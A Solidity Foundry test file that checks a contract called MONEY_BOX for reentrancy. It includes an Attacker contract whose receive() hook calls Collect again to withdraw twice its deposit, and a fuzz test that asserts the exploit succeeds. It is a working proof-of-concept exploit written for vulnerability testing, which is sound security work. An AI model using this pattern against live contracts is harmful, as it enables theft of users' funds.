
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/MONEY_BOX.sol";

contract TestReentrancyMONEY_BOX is Test {

    MONEY_BOX public _contractUnderTest;
    Log public logFile;
    Attacker public _attacker;

    function setUp() public {
        logFile = new Log();
        _contractUnderTest = new MONEY_BOX();
        _contractUnderTest.SetMinSum(1);
        _contractUnderTest.SetLogFile(address(logFile));
        _contractUnderTest.Initialized();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 && attackVal <= type(uint128).max / 2);
        

        

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        
        _attacker.setupAttack{value: attackVal}(attackVal);
        vm.warp(block.timestamp + 100);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = MONEY_BOX(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        victim.Put{value: msg.value}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.Acc(address(this)).balance;

        attackAmount = val;

        uint256 startBal = address(this).balance;
        victim.Collect(val);
        uint256 endBal = address(this).balance;

        if (endBal == startBal + 2 * val && victim.Acc(address(this)).balance == 0) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(attackAmount);
        } else {
            revert("Exploit revert");
        }
    }
}
